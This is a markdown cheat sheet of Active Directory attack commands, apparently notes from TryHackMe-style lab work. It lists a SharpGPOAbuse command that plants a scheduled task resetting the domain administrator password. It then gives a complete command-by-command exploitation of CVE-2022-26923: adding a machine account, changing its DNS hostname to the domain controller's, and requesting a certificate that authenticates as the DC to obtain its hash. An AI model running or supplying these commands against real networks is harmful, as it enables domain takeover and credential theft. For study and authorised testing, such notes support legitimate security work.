# Active Directory
## Group Policies
| Info | Command | 
|:-----|:--------|
| Upload SharpGPOAbuse | `upload /home/kali/share/windows/privesc/SharpGPOAbuse.exe` |
| Create Group Policy Task | `.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author SPRAY\administrator --Command "cmd.exe" --Arguments "net user administrator P@ssw0rd123 /domain" --GPOName "DCPolicy"` |
| Force GPO update | `gpupdate /force` |

https://wald0.com/?p=179

https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master


## CVE-2022-26923
### Overview
1. Compromise the credentials of a low-privileged AD user.
2. Use those credentials to enrol a new host on the domain.
3. Alter the DNS hostname attribute of the Computer AD Object to that of a privileged host, such as a Domain Controller.
4. Remove the SPN attributed to bypass the unique SPN conflict issue.
5. Request a Machine certificate using the default template.
6. Perform Kerberos authentication with the received template, now as the privileged machine account instead of our fake machine account.

### Exploitation
| Info | Command | 
|:-----|:--------|
| Request Certificate | `certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User` |
| Verify that this certificate is valid | `certipy auth -pfx thm.pfx` |
| Add Computer to the domain | `addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'` |
| Generate Certificate for new computer | `certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine` |
| Verify new Certificate | `certipy auth -pfx thmpc.pfx` |
| List Current Computer object | `Get-ADComputer THMPC -properties dnshostname,serviceprincipalname` |
| Remove current SPN | `Set-ADComputer THMPC -ServicePrincipalName @{}` |
| Change hostname to be that of the DC | `Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com` |
| Verify change | `Get-ADComputer THMPC -properties dnshostname,serviceprincipalname` | 
| Forge a malicious certificate | `certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine` | 
| Verify certificate and get hash | `certipy auth -pfx lundc.pfx` |
